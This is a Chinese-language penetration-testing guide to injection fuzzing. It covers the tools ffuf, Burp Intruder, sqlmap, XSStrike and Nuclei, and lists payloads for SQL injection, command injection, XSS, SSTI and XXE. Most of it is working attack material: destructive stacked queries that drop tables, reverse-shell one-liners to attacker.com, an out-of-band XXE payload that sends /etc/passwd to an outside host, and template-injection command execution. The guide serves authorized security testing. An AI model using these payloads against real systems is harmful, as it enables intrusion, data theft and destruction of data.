# 注入 Fuzzing 指南方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供注入漏洞 Fuzzing 测试的系统化方法，帮助通过自动化 fuzzing 技术快速发现潜在的注入漏洞。

## 1.2 适用范围
适用于 SQL 注入、命令注入、XSS、SSTI、XXE 等各类注入漏洞的 fuzzing 测试。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：注入 Fuzzing 测试

### 2.1 技术介绍

Fuzzing（模糊测试）是一种通过向目标程序提供大量非预期输入并监控异常来发现漏洞的自动化测试技术。在注入漏洞检测中，fuzzing 用于快速发现潜在的注入点。

**Fuzzing 类型：**
| 类型 | 描述 | 适用场景 |
|-----|------|---------|
| **基于字典** | 使用已知 Payload 列表 | 常见注入检测 |
| **基于变异** | 对正常输入进行变异 | 绕过过滤 |
| **基于生成** | 根据协议/格式生成 | 结构化测试 |
| **智能 Fuzzing** | 根据响应动态调整 | 高效测试 |

### 2.2 Fuzzing 工具

#### 2.2.1 综合 Fuzzing 工具

**ffuf：**
```bash
# 基础 fuzzing
ffuf -u http://target/page?FUZZ=value -w params.txt

# POST fuzzing
ffuf -u http://target/page -X POST -d "param=FUZZ" -w payloads.txt

# Header fuzzing
ffuf -u http://target/page -H "X-Custom: FUZZ" -w payloads.txt

# 并发 fuzzing
ffuf -u http://target/page?id=FUZZ -w payloads.txt -t 50

# 递归 fuzzing
ffuf -u http://target/page?id=FUZZ -w payloads.txt -recursion
```

**Burp Suite Intruder：**
```
# 攻击类型
- Sniper: 单个 payload 逐个位置
- Battering Ram: 相同 payload 多位置
- Pitchfork: 不同 payload 对应不同位置
- Cluster Bomb: 多 payload 组合

# 配置步骤
1. 选择请求，发送到 Intruder
2. 选择攻击类型
3. 标记 payload 位置
4. 选择 payload 列表
5. 开始攻击
```

#### 2.2.2 专用 Fuzzing 工具

**SQLMap：**
```bash
# 基础 fuzzing
sqlmap -u "http://target/page?id=1" --batch

# 全面 fuzzing
sqlmap -u "http://target/page?id=1" --level=5 --risk=3

# 指定参数 fuzzing
sqlmap -u "http://target/page" --data="id=1&name=test" --dbms=mysql
```

**XSStrike：**
```bash
# XSS fuzzing
xsstrike -u "http://target/search?q=test"

# 全面检测
xsstrike -u "http://target/search?q=test" --fuzzer --threads 5
```

**Nuclei：**
```bash
# 注入漏洞扫描
nuclei -u http://target -t exposures/
nuclei -u http://target -t vulnerabilities/

# 指定模板
nuclei -u http://target -t sqli.yaml -t xss.yaml
```

### 2.3 Fuzzing Payload 设计

#### 2.3.1 SQL 注入 Payload

```
# 基础 Payload
'
"
;
--
#
/*
*/

# 联合查询
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--

# 错误注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--

# 时间盲注
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--
'; WAITFOR DELAY '0:0:5'--

# 布尔盲注
' AND '1'='1
' AND '1'='2
' AND 1=1
' AND 1=2

# 堆叠查询
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','password')--

# 编码 Payload
%27%20OR%20%271%27%3D%271
\u0027 OR \u00271\u0027=\u00271
```

#### 2.3.2 命令注入 Payload

```
# 基础 Payload
;id
|id
`id`
$(id)
&id
||id
&&id

# 时间延迟
;sleep 5
;ping -c 5 127.0.0.1
;timeout 5
;WAITFOR DELAY '0:0:5'

# 反向 Shell
;bash -i >& /dev/tcp/attacker.com/4444 0>&1
;nc -e /bin/bash attacker.com 4444

# 编码 Payload
%3Bid
%7Cid
%60id%60
```

#### 2.3.3 XSS Payload

```
# 基础 Payload
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

# 事件处理器
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

# 协议注入
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# 编码 Payload
&#60;script&#62;alert(1)&#60;/script&#62;
\u003cscript\u003ealert(1)\u003c/script\u003e
%3Cscript%3Ealert(1)%3C/script%3E
```

#### 2.3.4 SSTI Payload

```
# Jinja2
{{7*7}}
{{7*'7'}}
{{config}}
{{self._app_ctx_class}}

# Freemarker
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}

# Velocity
#set($x=1)
$x

# Django
{{config.SECRET_KEY}}
```

#### 2.3.5 XXE Payload

```
# 基础 XXE
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

# XXE OOB
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://dnslog.cn/?data=%file;">
  %remote;
]>

# 编码 XXE
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file%3a%2f%2f%2fetc%2fpasswd">]>
```

### 2.4 Fuzzing 策略

#### 2.4.1 参数 Fuzzing

```bash
# 发现隐藏参数
ffuf -u http://target/page -X POST -d "FUZZ=value" -w params.txt

# 参数值 fuzzing
ffuf -u http://target/page?id=FUZZ -w payloads.txt

# 多参数 fuzzing
ffuf -u http://target/page?id=FUZZ1&name=FUZZ2 -w payloads1.txt:FUZZ1 -w payloads2.txt:FUZZ2
```

#### 2.4.2 Header Fuzzing

```bash
# User-Agent fuzzing
ffuf -u http://target/page -H "User-Agent: FUZZ" -w xss-payloads.txt

# Referer fuzzing
ffuf -u http://target/page -H "Referer: FUZZ" -w sqli-payloads.txt

# X-Forwarded-For fuzzing
ffuf -u http://target/page -H "X-Forwarded-For: FUZZ" -w sqli-payloads.txt

# Cookie fuzzing
ffuf -u http://target/page -H "Cookie: session=FUZZ" -w payloads.txt
```

#### 2.4.3 路径 Fuzzing

```bash
# 目录扫描
ffuf -u http://target/FUZZ -w common.txt

# 文件扫描
ffuf -u http://target/FUZZ -w files.txt -e .php,.asp,.aspx,.jsp

# 扩展名扫描
ffuf -u http://target/admin.FUZZ -w extensions.txt
```

#### 2.4.4 内容类型 Fuzzing

```bash
# Content-Type fuzzing
ffuf -u http://target/api -X POST -H "Content-Type: FUZZ" -w content-types.txt -d '{"test":"value"}'

# 常见 Content-Type
application/json
application/xml
application/x-www-form-urlencoded
multipart/form-data
text/xml
application/soap+xml
```

### 2.5 响应分析

#### 2.5.1 响应指标

| 指标 | 说明 | 可能漏洞 |
|-----|------|---------|
| **状态码变化** | 200->500, 200->403 | 注入触发错误 |
| **响应长度变化** | 明显增加或减少 | 内容注入 |
| **响应时间变化** | 明显延迟 | 时间盲注 |
| **关键词出现** | SQL 错误、异常信息 | 注入成功 |
| **HTML 结构变化** | 标签变化、JS 执行 | XSS |

#### 2.5.2 自动化分析

```bash
# ffuf 过滤器
ffuf -u http://target/page?id=FUZZ -w payloads.txt -fr "error" -fs 1234 -ft 5.0

# -fr: 过滤响应中包含关键词
# -fs: 过滤响应长度为指定值
# -ft: 过滤响应时间超过指定秒数
# -mc: 匹配指定状态码
# -mr: 匹配正则表达式
```

### 2.6 Fuzzing 最佳实践

1. **速率限制**：避免过快请求触发 WAF 或封禁
2. **错误处理**：记录和分析所有错误响应
3. **结果验证**：手动验证 fuzzing 发现的可疑点
4. **日志记录**：完整记录 fuzzing 过程和结果
5. **合法授权**：仅在授权范围内进行 fuzzing

---

# 第三部分：附录

## 3.1 Fuzzing 字典文件

**参数名字典：**
```
id
user_id
userid
uid
username
name
email
password
pass
pwd
search
query
q
keyword
file
path
dir
folder
page
limit
offset
sort
order
filter
category
type
```

**常见 Payload 列表：**
- SecLists (https://github.com/danielmiessler/SecLists)
- PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
- FuzzDB (https://github.com/fuzzdb-project/fuzzdb)

## 3.2 参考资源

- [OWASP Fuzzing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Fuzzing)
- [ffuf Documentation](https://github.com/ffuf/ffuf)
- [Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [SecLists](https://github.com/danielmiessler/SecLists)
